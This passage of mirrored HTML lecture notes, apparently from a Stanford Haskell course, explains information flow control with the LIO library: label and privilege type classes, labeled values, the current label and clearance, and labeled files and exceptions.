+<pre class="sourceCode"><code class="sourceCode haskell"><span class="kw">class</span> <span class="kw">Eq</span> a <span class="ot">=&gt;</span> <span class="dt">POrd</span> a <span class="kw">where</span><br /><span class="ot">    leq </span><span class="ot">::</span> a <span class="ot">-&gt;</span> a <span class="ot">-&gt;</span> <span class="dt">Bool</span><br /><span class="kw">class</span> (<span class="dt">POrd</span> a, <span class="kw">Show</span> a, <span class="kw">Read</span> a) <span class="ot">=&gt;</span> <span class="dt">Label</span> a <span class="kw">where</span><br /><span class="ot">    lub </span><span class="ot">::</span> a <span class="ot">-&gt;</span> a <span class="ot">-&gt;</span> a<br /><span class="ot">    glb </span><span class="ot">::</span> a <span class="ot">-&gt;</span> a <span class="ot">-&gt;</span> a</code></pre>
+<ul>
+<li>Separately, define privileges as any type with <span class="math"> ⊑ <sub><em>p</em></sub></span> for a given label type</li>
+</ul>
+<pre class="sourceCode"><code class="sourceCode haskell"><span class="co">-- PrivTCB is private class, not exposed to untrusted code</span><br /><span class="kw">class</span> (<span class="dt">Label</span> l, <span class="dt">PrivTCB</span> p) <span class="ot">=&gt;</span> <span class="dt">Priv</span> l p <span class="kw">where</span><br /><span class="ot">    leqp </span><span class="ot">::</span> p <span class="ot">-&gt;</span> l <span class="ot">-&gt;</span> l <span class="ot">-&gt;</span> <span class="dt">Bool</span></code></pre>
+<ul>
+<li>Note <code>PrivTCB</code> requirement in context--prevents untrusted code from defining instances of <code>Priv</code> class.</li>
+</ul></li>
+<li>These labels can easily represent many more lattice points
+<ul>
+<li>E.g., labels can be sets of users whose private data may influence value</li>
+</ul></li>
+</ul>
+<h1 id="need-pure-side-effectful-computations">Need pure, side-effectful computations</h1>
+<ul>
+<li><p>Represent labeled pure values with type wrapper</p>
+<pre class="sourceCode"><code class="sourceCode haskell"><span class="kw">data</span> <span class="dt">Labeled</span> l t <span class="fu">=</span> <span class="dt">LabeledTCB</span> l t</code></pre>
+<ul>
+<li>Pure values suitable for mashalling, insertion in database</li>
+</ul></li>
+<li>The <code>LIO l</code> monad (for <code>Label l</code>) is a state monad w. <em>current</em> label
+<ul>
+<li>Current label rises to LUB of all data observed</li>
+</ul></li>
+<li><p>Can label and unlabel pure values in <code>LIO</code> monad:</p>
+<pre class="sourceCode"><code class="sourceCode haskell"><span class="ot">label </span><span class="ot">::</span> <span class="dt">Label</span> l <span class="ot">=&gt;</span> l <span class="ot">-&gt;</span> a <span class="ot">-&gt;</span> <span class="dt">LIO</span> l (<span class="dt">Labeled</span> l a)<br /><span class="ot">unlabel </span><span class="ot">::</span> (<span class="dt">Label</span> l) <span class="ot">=&gt;</span> <span class="dt">Labeled</span> l a <span class="ot">-&gt;</span> <span class="dt">LIO</span> l a<br /><span class="ot">unlabelP </span><span class="ot">::</span> <span class="dt">Priv</span> l p <span class="ot">=&gt;</span> p <span class="ot">-&gt;</span> <span class="dt">Labeled</span> l a <span class="ot">-&gt;</span> <span class="dt">LIO</span> l a<br /><span class="ot">toLabeled </span><span class="ot">::</span> (<span class="dt">Label</span> l) <span class="ot">=&gt;</span> l <span class="ot">-&gt;</span> <span class="dt">LIO</span> l a <span class="ot">-&gt;</span> <span class="dt">LIO</span> l (<span class="dt">Labeled</span> l a)</code></pre>
+<ul>
+<li><code>label</code> requires value label to be above current label</li>
+<li><code>unlabel</code> raises current label to LUB with removed <code>Labeled</code> (<code>unlabelP</code> uses privileges to raise label less)</li>
+<li><code>toLabeled</code> takes computation that would have raised current label, and instead of raising label, wraps result in <code>Labeled</code></li>
+</ul></li>
+</ul>
+<h1 id="other-lio-features">Other <code>LIO</code> features</h1>
+<ul>
+<li>Clearance
+<ul>
+<li>Special label maintained w. current label in <code>LIO</code> state</li>
+<li>Represents upper bound on current label</li>
+<li>Can lower clearance to label, but raising requires privileges</li>
+<li>Allows &quot;need-to-know&quot; policies, reducing danger of covert channels</li>
+</ul></li>
+<li>Labeled file system
+<ul>
+<li>Stores labels along with files</li>
+</ul></li>
+<li>Labeled exceptions
+<ul>
+<li>Can only catch exceptions thrown at points below your clearance</li>
+<li>Get tainted by exception when you catch it</li>
+</ul></li>
+<li>Research in progress to build web framework using <code>LIO</code>
+<ul>
+<li>Allows users to upload untrusted applets into web server</li>
+</ul></li>
+</ul>
+</body>
+
+<!-- Mirrored from www.scs.stanford.edu/11au-cs240h/notes/ifc.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 19 Dec 2016 04:55:13 GMT -->
+</html>
